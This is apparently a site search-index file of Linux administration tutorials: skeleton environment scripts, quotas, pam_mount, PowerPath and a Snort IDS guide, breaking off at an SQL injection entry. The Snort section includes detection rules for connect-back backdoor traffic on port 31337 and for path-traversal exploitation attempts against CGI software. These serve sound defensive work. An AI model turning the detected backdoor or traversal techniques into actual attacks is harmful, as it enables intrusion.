all those files should be like: ll = ls -l\nFor those who are using JAVA_HOME environment, there is a special addition which will auto-create the full path: JVM = 1.5.14\nThis will automatically create the correct path to JVM. Now you need the following script for this syntax to be effective. Place it in `/etc/global_skel/global_alias_env.pl`: ```perl #!/usr/bin/perl -w # Made by Pierre Mavro # Environnement charger for global users use strict; use Term::ANSIColor qw(:constants); # Vars my $file_to_analyse=$ARGV[0]; my $method; my $mypath=\"\"; my $counter=0; # Function to check which type of file does it have to be treated sub get_enval { open FILER, \"\u003c$ENV{HOME}/mycompany_bash/$file_to_analyse\" or die \"Couln't open file : $!\\n\"; open FILEW, \"\u003e\u003e/tmp/$ENV{USER}_genprofil\" or die \"Cannot create file on /tmp : $!\"; while () { if ($_ =~ /^(\\w*)(\\ |)\\=(\\ |)(.*)/) { # Keep contents my $first_arg=$1; my $second_arg=$4; # Alias if ($method eq \"alias\") { # Save alias in file print FILEW \"alias $1='$4'\\n\"; } elsif ($method eq \"environnement\") { # Env + AutoPATH the JVM for export if ($first_arg =~ /(jvm|jdk)/i) { if ($second_arg =~ /(\\d\\.\\d)\\.(\\d+)/) { # Convert to the good format and save printf FILEW \"export JAVA_HOME='/test/jdk$1.0_%#02s'\\n\", $2; } else { die \"Your JDK PATH is in a bad format, please contact ITs\"; } } else { # Convert first arg to uppercase and save print FILEW \"export \\U$first_arg\\E=$second_arg\\n\"; } } else { # If not reconnized die die \"Problem on charging $method : $_\\n\"; } } elsif ($method eq \"path\") { chomp $_; unless ($_ =~ /^#/) { $mypath=\"$mypath:$_\"; } } } if ($method eq \"path\") { print FILEW \"PATH=$ENV{PATH}$mypath\\n\"; print FILEW \"PATH_PERSO=$mypath\\n\"; } close FILEW; close FILER; } sub check_problems { if ($file_to_analyse =~ /env/i) { $counter++; } if ($file_to_analyse =~ /alias/i) { $counter++; } if ($file_to_analyse =~ /path/i) { $counter++; } # If more than one path/env/alias... don't analyse this file if ($counter ne 1) { print CLEAR, RED, \"\\nWARNING : there is a problem with your $file_to_analyse file. Can't reconize what kind of file it is. Please rename this file correctly.\\n\", RESET; } } # Check for problems before starting \u0026check_problems; # Alias if ($file_to_analyse =~ /env/i) { $method=\"environnement\"; \u0026get_enval; # Environnement } elsif ($file_to_analyse =~ /alias/i) { $method=\"alias\"; \u0026get_enval; # Path } elsif ($file_to_analyse =~ /path/i) { $method=\"path\"; \u0026get_enval; } Now add execution rights:\nchmod 755 /etc/global_skel/global_alias_env.pl Skel linkIn your /etc/skel, you need to make some changes. First delete all the content:\nrm -Rf /etc/skel mkdir /etc/skel Next, we’ll add some example files to help users set their custom environment. Create a folder and some files:\nmkdir /etc/skel/mycompany_bash cd /etc/skel/mycompany_bash touch alias env path Now put this content in the alias file:\n## Personal Mycompany Aliases ## # # Purpose: # This file contains your custom aliases, # these little shorcuts that ease your life. # # Instructions: # - If you want to put comments, add # # - If you need to create aliases follow this example: # myalias = command # - Your first argument should only be written in lowercase ! # # Your alias file can be updated with the \"uu\" command or relog yourself. # # If you need other aliases files, simply create in your ~/mycompany_bash directory # a new file containing \"alias\" in its name. # # Examples : # javav = java -version # ll = ls -lah # Next env file:\n## Personal Mycompany Environnement ## # # Purpose: # This file contains your custom environment variables # that can be used in your scripts or aliases # # One usefull behavior is to specify some predefined tokens like: # JDK = 1.5.0_14 # that will automatically modify your path to add this JDK version and create JAVA_HOME variable. # # Instructions: # - If you want to put comments, add # # - If you need to create environment variables follow this example: # NAME_OF_THE_VARIABLE = value # - Your first argument (NAME_OF_THE_VARIABLE here) sould only be written in uppercase ! # # Your environment file can be updated with the \"uu\" command or relog yourself. # # If you need other environment files, simply create in your ~/mycompany_bash directory, # a new file containing \"env\" in its name. # # Examples : # MY_ENV_TEST = test # MY_ENV_TEST2 = $MY_ENV_TEST/test2 # DEV_DIR = ~/dev # JDK = 1.5.0_14 # Then the path file:\n## Personal Mycompany Path ## # # Purpose: # This file contains your custom amendment to your PATH environment variable. # It is used to add some directories in which binaries can be used everywhere # without referencing the full path. # # Instructions : # - If you want to put comments, add # # - If you need to add directories to your path, just simply put them one by one (only one per line). # # Your path file can be updated with the \"uu\" command or relog yourself. # # If you need other path files, simply create in your ~/mycompany_bash directory # a new file containing \"path\" in its name. # # Examples : # /usr/bin # /usr/sbin # Quotas linkFirst, you should look at this documentation: Quotas Documentation.\nFor LDAP:\nIf you want to run a solution on FreeBSD, you can look at pam_quota. Unfortunately, the developer didn’t have time to create it for Linux. So we must find another way and look at session scripts: Pam-script Documentation.\nLDAP linkIf you have an LDAP, we must take all users and create a home directory for each one of them and add quotas. That’s why we will use PAM-script to do it automatically.\nOnce pam-script has been set up, please add these lines to the /etc/security/onsessionopen file:\n#!/bin/sh # Made by Pierre Mavro soft_limit=90M hard_limit=100M quota_folder=/home userid=$1 service=$2 if [ $userid != \"root\" ] ; then if [ -x /usr/sbin/quotatool ] ; then /usr/sbin/quotatool -u $userid -bq $soft_limit -l $hard_limit $quota_folder else echo \"/usr/sbin/quotatool doesn't exist. Can't set user quota\" exit 1 fi fi You just need to set the 3 variables as you wish and it will automatically be applied at the next user connection.\nPAM linkIf you have PAM and create your own users, just edit adduser.conf and configure this line:\n# If QUOTAUSER is set, a default quota will be set from that user with # `edquota -p QUOTAUSER newuser' QUOTAUSER=\"\" Add your desired quota user in this line. Now create a new folder:\nmkdir -p /etc/scripts/ And add this script for already created users to have quotas set:\n#!/bin/sh # Set quotas for every users # Made by Pierre Mavro # Set soft limit (in Mo) soft_limit=\"90M\" # Set hard limit (in Mo) hard_limit=\"100M\" # Quota directoy (where users are located) home_users=\"/home\" # Quotatool binary quotatool_bin=\"/usr/sbin/quotatool\" if [ -x $quotatool_bin ] ; then for username in `ls $home_users | grep -v aquota.user` ; do quotatool -u $username -bq $soft_limit -l $hard_limit $home_users done else echo \"Sorry but couldn't locate or can't execute $quotatool_bin\" exit 1 fi Adapt this as you wish and add permissions to make it executable:\nchmod 740 /etc/scripts/set_quotas.sh Now add this to your crontab to run every 5 minutes for example.\nShare Servers Profiles linkNFS linkFor a NFS server, read the NFS Server Documentation.\nWhen installed, just configure the /etc/export file:\n/home (rw) After that restart NFS services.\nSamba linkFor Samba, please follow this: Samba and OpenLDAP Documentation.\nGuests Servers linkNow I need to set up a Linux server. When users log into it, the Home profile should be automatically mounted and unmounted at logout.\nLinux linkWe will use pam_mount to automate the NFS mount. Please follow this documentation.\nEdit the /etc/security/pam_mount.conf file and configure what you need. Here we would like users to have NFS home share mounted from the server at logon. Add this line at the end of the file:\nvolume * nfs my_nfs_server /home/\u0026 ~ - - - Edit the /etc/pam.d/ssh file and add these lines:\n... auth required pam_env.so envfile=/etc/default/locale auth required pam_mount.so @include common-auth ... @include common-account session required pam_mount.so @include common-session ... "
            }
        );
    index.add(
            {
                id:  629 ,
                href: "\/PAM_mount:_Monter_des_partages_r%C3%A9seaux_au_login\/",
                title: "PAM mount: Automatically Mount Network Shares at Login",
                description: "Guide on how to use PAM mount to automatically mount network shares when users log in to a system.",
                content: "Introduction linkYou may need sometimes to automatically mount network shares. This can be done with the pam_mount module.\nInstallation linkFor installation:\napt-get install pam_mount Configuration linkpam_mount.conf linkEdit the /etc/security/pam_mount.conf file and configure what you need. Here we would like users to have nfs home share to be mounted from the server at logon. Add this line at the end of the file:\nvolume * nfs my_nfs_server /home/\u0026 ~ - - - You may also need to have other mount points for other things like smb, cifs or fuse:\nvolume user smbfs krueger public /home/user/krueger - - - volume * fuse - \"sshfs#\u0026@fileserver:\" /home/\u0026 - - - Application linkYou must choose an application to mount automatically your share. For example I choose SSH. When a user logs into SSH it must mount the NFS share, so edit this file:\n... auth required pam_env.so envfile=/etc/default/locale auth required pam_mount.so @include common-auth ... @include common-account session required pam_mount.so @include common-session ... Now when you’ll login, it will automatically mount your home.\n"
            }
        );
    index.add(
            {
                id:  630 ,
                href: "\/Numlockx_:_Activer_le_pav%C3%A9_num%C3%A9rique_au_boot\/",
                title: "Numlockx: Enabling the numeric keypad at boot",
                description: "How to automatically enable the numeric keypad at boot time using numlockx on Linux systems.",
                content: "Introduction linkThe numeric keypad is not necessarily activated at boot time, which can quickly become annoying. Here’s a method to enable it automatically on Gnome.\nInstallation link apt-get install numlockx Configuration linkWe’ll use numlockx with GDM. Insert this line into /etc/gdm/Init/Default:\ntest -x /usr/bin/numlockx \u0026\u0026 /usr/bin/numlockx on Now you just need to restart your GDM and it works! :-)\n"
            }
        );
    index.add(
            {
                id:  631 ,
                href: "\/S%C3%A9curiser_ses_scripts_PHP\/",
                title: "Securing PHP Scripts",
                description: "Guide for securing PHP scripts with documentation resources for better security practices.",
                content: "PHP is a powerful language that allows you to do almost anything. It’s therefore easy to create security vulnerabilities. That’s why I’m offering this documentation to help you avoid making mistakes:\nDocumentation on PHP security\nIntrusion Detection For PHP Applications With PHPIDS\n"
            }
        );
    index.add(
            {
                id:  632 ,
                href: "\/Mise_en_place_d\u0027un_Proxy_MySQL\/",
                title: "Setting up a MySQL Proxy",
                description: "How to set up a MySQL proxy that can also serve as a load balancer.",
                content: "Introduction linkHere is documentation for setting up a MySQL proxy that can also serve as a Load Balancer:\nInstalling MySQL Proxy\n"
            }
        );
    index.add(
            {
                id:  633 ,
                href: "\/Comment_tuer_une_application_qui_a_plant%C3%A9,_ou_comment_faire_face_%C3%A0_un_%C3%A9cran_%C2%AB_fig%C3%A9_%C2%BB_%5C?\/",
                title: "How to Kill a Crashed Application or Handle a Frozen Screen",
                description: "Methods to recover from frozen applications or system hangs in Linux without resorting to hard resets",
                content: "You might have been told that “Linux is great because it never crashes!” Well, here you are, helplessly staring at your frozen screen for the past 5 minutes, with an unresponsive keyboard and a mouse you’re shaking in all directions… Don’t panic: there’s a way to solve the problem, and in a much less brutal way than using the Power or Reset buttons on your computer!\nSeveral scenarios may occur:\nIf the crashed program was launched from the command line, you still have access to the launch terminal, and your keyboard works, simply press [Ctrl]+[C]. You’ll regain control, and all windows of the application will disappear.\nIf the program was launched graphically (via a menu or double-clicking an icon), open a terminal and type the command: ~$ killall -9 program_name.\nIf the previous solution doesn’t work, you can replace the program name with its PID (Process IDentifier). To determine the PID of the crashed application, use the command:\n~$ ps -ef The pattern corresponds to a string contained in the name of the offending program. For example, if the Gnome editor, Gedit, has crashed, enter the command:\n~$ ps -ef The application closes and you regain control.\nIf only the mouse has abandoned you, don’t forget that the keyboard shortcut [Alt]+[F2] allows you to call the application launcher. You can then type the name of your command terminal (gnome-terminal under Gnome or konsole under KDE), then enter a command to kill the application.\nIf the X graphical server has crashed and your keyboard still works, it will be impossible to launch or use a graphical application. Therefore, you can’t use your graphical console to kill the application that caused your graphical server to freeze. In this case, you need to switch to tty text mode (an absolute text mode that allows direct communication with the core of your machine).\nTo do this, on some distributions, repeatedly pressing the [Windows] key on the keyboard should do the trick. This key is sometimes configured to allow switching from your graphical interface to different tty interfaces. Then, after entering your login and password, you can use the kill command as specified above.\nHowever, the [Windows] key may not be configured this way. In that case, the shortcuts [Ctrl]+[Alt]+[F1], [Ctrl]+[Alt]+[F2], [Ctrl]+[Alt]+[F3], [Ctrl]+[Alt]+[F4], [Ctrl]+[Alt]+[F5], etc., allow you to switch to tty1, tty2, tty3, etc. modes respectively. To return to graphical mode, use [Alt]+[F7].\nThis actually depends on what is defined by default in the /etc/inittab file (lines like 1:2345:respawn:/sbin/getty 38400 tty1, 2:23:respawn:/sbin/getty 38400 tty2, etc.), but this is what is observed on most distributions.\nIf despite stopping the responsible applications, your system is still frozen, then your only option is to enter the following command in tty mode, which allows for a “clean” restart: ~$ shutdown -r now When the problem is related to the X server, the simplest solution is to restart it. To do this, just type the keyboard combination [Ctrl]+[Alt]+[Backspace]. The X server will then kill all graphical applications and thus the current user sessions, then restart itself. This brings you back to the login screen.\nAnother solution is to use a series of keyboard combinations, based on the [SysRq] key (same key as [Print screen]), to be typed in a well-defined order:\n[Alt]+[SysRq]+[R]: places the keyboard in “raw mode”. Then, try pressing [Ctrl]+[Alt]+[Backspace] to kill the X server. If that doesn’t work, continue with what follows. [Alt]+[SysRq]+[S]: this allows writing all unsaved data to disk (referred to as disk “synchronization”). [Alt]+[SysRq]+[E]: to send a termination signal to all processes, except init. [Alt]+[SysRq]+[I]: to kill all active processes, except init. [Alt]+[SysRq]+[U]: to unmount, then remount all partitions in read-only mode (this will avoid a filesystem check at restart). [Alt]+[SysRq]+[B]: to restart the system. You can also press the reset button on your machine. These key combinations allow sending commands directly to the kernel, commands that will allow recording open files despite the absence of a graphical interface, since the latter is frozen.\nWarning, for this to work, your kernel must have been compiled with support for “magic keys” (the CONFIG_MAGIC_SYSRQ option must be set to “y”), and it must be activated in /proc (which is almost always the case in common distributions like Ubuntu or Mandriva). To verify:\n~$ grep CONFIG_MAGIC_SYSRQ /boot/config-2.6.15-27-386 CONFIG_MAGIC_SYSRQ=y ~$ cat /proc/sys/kernel/sysrq 1 "
            }
        );
    index.add(
            {
                id:  634 ,
                href: "\/MySQL_Cluster_Load_Balanc%C3%A9_avec_Heartbeat\/",
                title: "MySQL Cluster Load Balanced with Heartbeat",
                description: "Documentation about setting up a load balanced MySQL cluster with Heartbeat, including links to detailed PDF resources.",
                content: "Here is documentation that requires good knowledge of MySQL replications and clustering techniques.\nIt can save you a lot of time even if you have the necessary knowledge:\nDocumentation on a Load-Balanced MySQL Cluster With MySQL 5.1\n"
            }
        );
    index.add(
            {
                id:  635 ,
                href: "\/Wine_:_Lancer_des_applications_windows_sur_linux\/",
                title: "Wine: Running Windows Applications on Linux",
                description: "A guide on how to use Wine to run Windows applications on Linux systems",
                content: "1 Introduction linkHello everyone! Want to run a Windows application on Linux and finding it complicated? Don’t worry! It’s actually very easy… just follow this tutorial.\n2 Installation linkAs usual:\napt-get install wine 3 Configuration linkWhat’s next? Do we need to configure lots of things like bottles and all that stuff? Actually no, the latest versions are well-made and the setup is super quick. We’ll run winecfg which will create our little environment:\nwinecfg Make sure the drives are properly displayed. Then click OK.\n4 Launching the application linkHere, I’ll use Spider Solitaire as an example. It’s a small game on Windows found at c:\\windows\\system32\\spider.exe. Simply copy it to /home/$USER/.wine/drive_c/windows/system32. As you can see, I placed it exactly in the same location as it was on Windows.\nNow we’re ready to launch it (with the absolute path):\nwine /home/$USER/.wine/drive_c/windows/system32/spider.exe Hurray, it works! :-)\n"
            }
        );
    index.add(
            {
                id:  636 ,
                href: "\/Migrer_de_Multipath_%C3%A0_Powerpath_sur_RedHat\/",
                title: "Migrating from Multipath to Powerpath on RedHat",
                description: "A guide on how to migrate from Multipath to Powerpath on RedHat Linux systems, including uninstallation of multipath, installation of Powerpath, verification, and LVM configuration.",
                content: "Introduction linkPowerpath is the multipathing solution for EMC arrays. The multipath package is so buggy on RedHat that you shouldn’t install it in production environments. This migration has been released on RedHat 4.6.EL.\nReminder: Multipathing brings redundancy functionalities with 2 links on a disk array without having I/O errors.\nUninstalling multipath linkMultipath package name (if installed) can be found this way:\nrpm -qa | grep multipath Next, you just need to use the package name and add it to the rpm command:\nrpm -e device-mapper-multipath-0.4.5-27.el4_6.3 Now reboot!\nInstallation linkNow we’ll install the package. Take it from the CD or anywhere else and install it:\nrpm -ivh EMCpower.Linux*.rpm Now you’ll need to launch the license key command:\nemcpreg -install Now update the initial ramdisk:\nmkinitrd -f /boot/initrd-`uname -r`.img `uname -r` Then reboot again!\nPowerpath verification linkYou may need to start Powerpath service:\n/etc/init.d/PowerPath start And also may reboot the server again. Now enter powermt command to verify if your LUN can be shown:\n$ powermt display dev=all Pseudo name=emcpowerb ? All the paths below are handled through this pseudo-device CLARiiON ID=APM00023500472 Logical device ID=600601F0310A00006F80C3D32D69D711? Unique ID of LUN (LUN Properties) state=alive; policy=CLAROpt; priority=0; queued-IOs=0? properties/status of the paths ============================================================================== ---------------- Host --------------- - Stor - -- I/O Path - -- Stats --- ### HW Path I/O Paths Interf. Mode State Q-IOs Errors ============================================================================== 2 QLogic Fibre Channel 2300 sdc SP A1 active alive 0 0 2 QLogic Fibre Channel 2300 sde SP B0 active alive 0 0 3 QLogic Fibre Channel 2300 sdg SP B1 active alive 0 0 3 QLogic Fibre Channel 2300 sdi SP A0 active alive 0 0 You can also check that you have emc devices:\n$ ls /dev/emcpower* emcpower emcpowera Configuring LVM linkNow all is ok, but you need to recover your previous partitions from LVM. So edit the LVM config file and add these arguments:\n... filter = [ \"r/sd*/\", \"a/.*/\",\" \"a|/dev/sdb[1-9]|\", \"a|/dev/mapper/.*$|\", \"r|.*|\" ] ... Now you can reboot or rebuild the LVM cache:\nvgscan -v lvmdiskscan Now you should see all your disks :-). Look also at the /dev/mapper and you’ll see them too.\n"
            }
        );
    index.add(
            {
                id:  637 ,
                href: "\/Solutions_pour_un_syst%C3%A8me_LVM_crypt%C3%A9\/",
                title: "Solutions for Encrypted LVM System",
                description: "Documentation and resources for managing encrypted LVM systems, including root partition encryption, migration, and resizing of encrypted LVM volumes.",
                content: "Encrypting the Root Partition with LVM linkHere is documentation explaining how to encrypt the root partition with LVM:\nDocumentation on crypting root LVM\nMigrating an Encrypted LVM Partition linkHere is documentation on encrypting LVM partitions with LUKS:\nDocumentation on How To Migrate to a full encrypted LVM system\nLVM2 Disk Replacement + Crypto and Data Migration\nResizing an Encrypted LVM linkHere is documentation for resizing an encrypted filesystem under LVM:\nDocumentation on Resizing an Encrypted FileSystem\n"
            }
        );
    index.add(
            {
                id:  638 ,
                href: "\/Introduction_aux_IDS_et_%C3%A0_SNORT\/",
                title: "Introduction to IDS and SNORT",
                description: "A comprehensive guide to Intrusion Detection Systems (IDS) and SNORT, covering installation, configuration, and best practices for network security monitoring.",
                content: "Introduction to IDS and SNORT linkIntrusion Detection Systems (IDS) are increasingly common and play an important and growing role in the security of today’s information systems. SNORT is one of these intrusion detection systems with the distinction of being open source software under the GPL license.\nNote: This document was written in 2006. Some versions and configurations of the software mentioned may differ from those shown here; please refer to the official project websites in case of issues.\nMany commercial solutions have emerged with the appearance of this previously underdeveloped market. However, there are different open source alternatives, which are often the basis for commercial products and whose performance and reliability are just as good as their competitors.\nWhile the technical aspects are sometimes complex, the organizational aspects are no less important in the implementation of these systems.\nIndeed, the deployment of IDS requires a qualified team, which can be outsourced to a specialized IT service company for installation and configuration, but also a team that will be responsible for monitoring the alerts raised, refining the configuration to minimize false positives, and implementing possible countermeasures to detected attacks.\nThis often underestimated aspect leads some companies to deploy IDS in their infrastructure and then leave them in place without monitoring, which makes them useless, or even dangerous for the information system.\nThere are mainly 2 types of IDS:\nHIDS (Host IDS), or system IDS, which locally analyze the integrity of machines via control of system calls, various event logs, file system integrity, etc.\nNIDS (Network IDS) which are based solely on captured network traffic and which most often operate on pattern matching rules that can be triggered through known signatures.\nNIDS analyze flows in real time (allowing for latency) and can reassemble frames (IP fragmentation), reconstruct flows (stream4) and manage states (stateful).\nProbes constitute the active agents of the IDS: they isolate the relevant information they capture, the events that are - a priori - suspicious, then send them up to a centralized system: the alert concentrator.\nThe alert format must be known to the concentrator. This issue gave rise to the IDMEF (Intrusion Detection Message Exchange Format) format, based on XML, which allows the standardization of different alerts raised.\nIn a large infrastructure, several probes are necessary. Care must then be taken to carefully choose the locations of these on the network in order to avoid unnecessarily overloading the alerts raised.\nPresentation of Snort\nSnort (click), which falls into the NIDS category, is a powerful, configurable open source product that meets the main constraints of intrusion detection.\nIt analyzes traffic in real time and can decode many protocols, perform pattern matching on captured packets, and also detect port scans.\nIt can send alerts via syslog, to a special file (socket or pipe for example), to a remote database (MySQL, MsSQL or other), or even via direct alerts (WinPopup).\nLike all open source projects, it has a large community, allowing for very quick responses to problems encountered or requests for information. The documentation provided is abundant and detailed, allowing you to get the most out of this powerful tool.\nPlacement in the architecture\nProbes must be placed carefully on the segments of the network to be audited: they would be useless, for example, on an administration segment where access would be considered secure and where the information returned would “blur” the analysis.\nThroughput should be taken into account as the number of alerts is often proportional to the traffic of the segment.\nA risk study (what should I protect? against whom? What is the degree of sensitivity of the information passing through this network segment? Etc.) must precede deployment in order to best determine the locations of future probes.\nProbes do not require an IP configuration, except if they require remote administration or communication with the alert concentrator.\nThe classic case of an architecture including a demilitarized zone (DMZ) and an Intranet: The probe downstream of the firewall will collect a large number of alerts and is not always necessary. It could be harmful during alert analysis.\nThe probe located in the DMZ is the most sensitive and should receive special attention. Indeed, in the event of a machine being compromised from the outside, it will be the one to raise the first alerts generated if detection occurs.\nAs for the probe placed in the intranet, its usefulness is proportional to the number of users and the degree of trust granted. It can be particularly useful for detecting worms, viruses, or backdoors, but also in the event of user workstations being compromised.\nPhysical aspects\nProbes must be able to analyze all of the traffic of the segment on which they act.\nConnected to a hub where packets are transmitted on all of its ports, they can be directly connected to any port.\nIn the case of use on a switch, they must be placed on replication ports (mirroring port).\nIt is possible to increase the stealth of the probes by making the physical connection to the network unidirectional, thus allowing only passive listening to traffic.\nThey will then be “transparent” but will require physical access for maintenance needs or for local analysis of alerts.\nInstallation and configuration linkThe installation of Snort, although relatively simple, does not allow the IDS to be used directly without prior modification of the default configuration. However, SNORT can be set up rudimentarily in less than an hour.\nNote: This document was written in 2006. Some versions and configurations of the software used according to these versions may be different from those mentioned; please refer to the official websites of the projects in question in case of problems.\nNetwork capture management is based on the pcap library (WinPcap under Windows). Snort therefore requires the latter to function correctly.\nThe latest stable version can be downloaded from (click) and is distributed under a BSD-type license; for more information on this subject (cf. (click).\nThe trivial installation of this library (Auto-installer) will not be detailed here.\nThe package to download is “Winpcap auto installer”. The developer will turn to the devel package containing the source codes of the library as well as more detailed technical documentation. Depending on the version and type of OS, installation may require a restart.\nThen comes the installation of Snort with the installer (click).\nBased on the same type of installer as Winpcap, one of the only modifiable options is the installation path of Snort (by default c:\\snort).\nThe tree structure is presented with the following folders:\nbin/ – containing the executable\ncontrib/ – containing the classic README file of open source projects.\ndoc/ – containing detailed documentation for installation and configuration. It also contains a FAQ (Frequently Asked Questions)\netc/ – containing the configuration files of the IDS, as well as a highly commented default configuration.\nlog/ – which will contain log files and any pcap recordings related to alerts.\nrules/ – containing rules for different alerts. It is also advised to update them regularly.\nschemas/ – containing schemas for different databases (MySQL, MsSQL, Oracle and PostgreSQL). It is indeed possible to send alerts to a remote database for specific processing.\nConfiguration\nMost of the configuration is stored in the etc/snort.conf file which will be called when Snort starts.\nThe file can be taken as is and linearly modified to adapt it to the needs and specificities of the server. Be careful, the “#” are comments and will therefore not be taken into account in the configuration.\nThe first two variables to define are:\nHOME_NET which defines the target network(s) to audit;\nEXTERNAL_NET which contains the networks considered hostile. In many cases, it will be set to “any” to not trust any network (case of a probe connected directly to the Internet for example).\nAlerts from HOME_NET will also be sent.\nTo only consider incoming alerts, it is possible to define it as follows:\nvar EXTERNAL_NET !$HOME_NET\nThen we specify the different machines on the network (SMTP, SNMP, HTTP, etc.), and the ports on which services are listening.\nRULE_PATH then allows us to define the path of the rules files containing the triggering rules for the different alerts.\nNext come the preprocessors which make it possible to follow connections, reassemble packets, decode certain types of protocols, etc.\nAs indicated in the default configuration, the syntax is:\npreprocessor : Here are the main preprocessors of Snort:\nflow for tracking IP packets (src port, dst port, etc.)\nfrag2 for reassembling IP packets (defragmentation)\nstream4 for TCP frame reassembly: stateful\nhttp_inspect for the HTTP decoder (field normalization, etc.)\nrpc_decode for the normalization and reassembly of RPC packets\nbo for Back Orifice backdoor traffic\ntelnet_decode for reassembling Telnet and FTP traffic\nflow-portscan sf Portscan for port scan detection\narpspoof for detecting L2 attacks such as ARP cache poisoning\nDetailed options are available in the default configuration file or on the online documentation (click \u0026 click).\nOutputs allow you to precisely configure the logging of alerts and pcap recordings (network traces).\nSeveral formats are available, the generic syntax is:\noutput : Syslog logging: local or remote escalation of alerts to a syslogd logging server.\nLocal:\noutput alert_syslog: LOG_AUTH LOG_ALERT Remote:\noutput alert_syslog: host=192.168.0.100:514, LOG_AUTH LOG_ALERT Pcap save: network traces related to alerts in pcap format, readable among others by the tools tcpdump or ethereal:\noutput log_tcpdump: tcpdump.log SQL/Oracle logging: sending alerts to an SQL/Oracle server:\noutput database: log, mysql, user=user password=pwd dbname=db host=localhost Where the server type can be adapted: mysql, mssql, postgresql, oracle or obdc, as well as the user and password.\n“Snort” / unified logging: binary format specific to Snort and allowing to increase the overall performance of recordings and limit the size of the output file:\noutput alert_unified: filename snort.alert, limit 128 Specific logging: depending on certain alerts. For example for a connect back type backdoor on TCP port 31337:\nruletype backdoor { type alert output log_tcpdump: trojan31337.log } With the associated rule:\nbackdoor tcp $HOME_NET any -\u003e $EXTERNAL_NET 31337 (msg:\"Backdoor 31337 detected\"; flags:A+;) The last point to take into account in this configuration is the activation of the different rule classes: the names of the rules are very explicit.\nIt is also possible to create your own set of rules: the syntax is very simple and many additional rules are available, for example on mailing lists such as bugtraq or directly on the Snort site.\nExample of an alert detecting the exploitation of a bug on a Web/CGI software package:\nalert tcp $EXTERNAL_NET any -\u003e $HTTP_SERVERS $HTTP_PORTS (msg:\"WEB-CGI progiciel_compta exploitation attempt\"; flow:to_server,established; uricontent:\"/prog_compta\"; content:\"../\"; content:\"%00\"; classtype:web-application-attack;) The configuration finished, Snort starts simply with:\nsnort -d -l ../log -c ../etc/snort.conf -i [interface] To determine the identifier of the interface, it is possible:\nto use Ethereal to retrieve the identifier of the interface,\nto retrieve the identifier directly in the Windows registry with the key HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces.\nExample of launch:\nsnort -d -l ../log -c ../etc/snort.conf -i \\Device\\NPF_{2D7E7BAE-3442-4FA1-A154-5172CAC0F038} Example configuration file linkThe entire file used in this folder for the configuration of the Open-Source intrusion detection system SNORT.\nNote: This document was written in 2006. Some versions and configurations of the software used according to these versions may be different from those mentioned; please refer to the official websites of the projects in question in case of problems.\n#-------------------------------------------------- # etc/snort.conf #-------------------------------------------------- # C networks 192.168.0.0 and 192.168.1.0 var HOME_NET [192.168.0.0/24,192.168.1.0/24] # All traffic except networks considered \"safe\" var EXTERNAL_NET !$HOME_NET # DNS servers var DNS_SERVERS $HOME_NET # SMTP servers var SMTP_SERVERS $HOME_NET # HTTP servers var HTTP_SERVERS $HOME_NET # SQL servers var SQL_SERVERS $HOME_NET # Telnet servers var TELNET_SERVERS $HOME_NET # SNMP servers var SNMP_SERVERS $HOME_NET # Listening ports on HTTP servers var HTTP_PORTS 80 # Ports on which shellcodes will be monitored # Port 80 (HTTP) too often causes false positives var SHELLCODE_PORTS !80 # Oracle Port var ORACLE_PORTS 1521 # AIM servers (IM) var AIM_SERVERS [64.12.24.0/23,64.12.28.0/23,64.12.161.0/24] # Path containing pattern matching rules var RULE_PATH ../rules # Preprocessors preprocessor flow: stats_interval 0 hash 2 preprocessor frag2 preprocessor stream4: disable_evasion_alerts preprocessor stream4_reassemble preprocessor http_inspect: global iis_unicode_map unicode.map 1252 preprocessor http_inspect_server: server default profile apache ports { 80 } preprocessor rpc_decode: 111 32771 preprocessor bo preprocessor telnet_decode preprocessor sfportscan: proto { all } memcap { 10000000 } sense_level { low } ignore_scanners { 192.168.1.1 192.168.1.10 } # Outputs output log_tcpdump: tcpdump.log output database: log, mysql, user=user password=pwd dbname=snort host=localhost output alert_unified: filename snort.alert, limit 128 output log_unified: filename snort.log, limit 128 # Activated rules include $RULE_PATH/local.rules include $RULE_PATH/bad-traffic.rules include $RULE_PATH/exploit.rules include $RULE_PATH/scan.rules include $RULE_PATH/ftp.rules include $RULE_PATH/telnet.rules include $RULE_PATH/dos.rules include $RULE_PATH/ddos.rules include $RULE_PATH/web-cgi.rules include $RULE_PATH/web-misc.rules include $RULE_PATH/web-client.rules include $RULE_PATH/web-php.rules include $RULE_PATH/sql.rules include $RULE_PATH/smtp.rules include $RULE_PATH/imap.rules include $RULE_PATH/other-ids.rules include $RULE_PATH/web-attacks.rules include $RULE_PATH/backdoor.rules include $RULE_PATH/shellcode.rules include $RULE_PATH/policy.rules include $RULE_PATH/virus.rules Conclusion and webography linkThis final part of the Open-Source IDS SNORT dossier briefly addresses subjects such as probe security and monitoring. Also find all the links related to this dossier.\nProbe security linkA probe is a sensitive element due to its function on the network: an attacker will try to hide the traces of his attack by compromising it.\nIt must therefore be given special attention regarding updates, especially Winpcap and Snort, and elementary security measures for it.\nMonitoring linkSeveral interfaces allow you to analyze the alerts sent by the probes. ACID (Analysis Console for Intrusion Databases) is one of the most powerful and also allows you to correlate alerts from different probes on the network.\nIt is accessible via a simple web browser and has many configuration options.\nIntrusion detection under Windows is not left behind thanks to ported applications such as Snort and Winpcap.\nIf the installation and configuration are relatively accessible, the work prior to the deployment of these systems should not be neglected: a precise study (budget/personnel, risk analysis, etc.) is necessary.\nIDS, although increasingly efficient, can be bypassed, particularly via hidden channels or even shellcode encodings, and constitute only a complementary means of security!\nIt would be illusory to think that an IDS could prevent an attack.\nIf properly configured and used, it can considerably reduce the damage caused by the compromise of machines on the network by reducing the reaction time of competent teams.\nThe main difficulty remains the analysis of event logs because an attack can quickly be drowned in a flow of false positives.\nResources linkhttp://www.secuobs.com/news/11052008-snort_ids.shtml\n"
            }
        );
    index.add(
            {
                id:  639 ,
                href: "\/Les_injections_SQL\/",
                title: "SQL Injections",
                description: "Understanding SQL injections, how they work, and how to protect against them in web applications.",
